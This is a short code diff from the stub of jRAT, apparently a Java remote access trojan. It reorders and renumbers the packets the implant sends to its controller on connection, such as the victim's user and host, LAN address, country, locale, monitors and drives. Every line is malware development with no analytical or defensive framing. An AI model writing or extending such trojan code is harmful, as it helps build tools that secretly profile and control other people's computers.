@@ -38,7 +38,7 @@ import se.jrat.stub.packets.outgoing.Packet28InitLanAddress;
 import se.jrat.stub.packets.outgoing.Packet6InitVersion;
 import se.jrat.stub.packets.outgoing.Packet31InitInstallationDate;
 import se.jrat.stub.packets.outgoing.Packet36Initialized;
-import se.jrat.stub.packets.outgoing.Packet47InitCountry;
+import se.jrat.stub.packets.outgoing.Packet8InitCountry;
 import se.jrat.stub.packets.outgoing.Packet5InitUserHost;
 import se.jrat.stub.packets.outgoing.Packet61InitMonitors;
 import se.jrat.stub.packets.outgoing.Packet62InitDrives;
@@ -151,6 +151,7 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet5InitUserHost());	
 		addToSendQueue(new Packet6InitVersion());
 		addToSendQueue(new Packet7InitServerID());
+		addToSendQueue(new Packet8InitCountry());
 
 
 
@@ -171,7 +172,6 @@ public class Connection implements Runnable {
 		}
 		addToSendQueue(new Packet28InitLanAddress(localip));
 
-		addToSendQueue(new Packet47InitCountry(System.getProperty("user.country")));
 
 		addToSendQueue(new Packet10InitDefaultLocale(Locale.getDefault()));
 
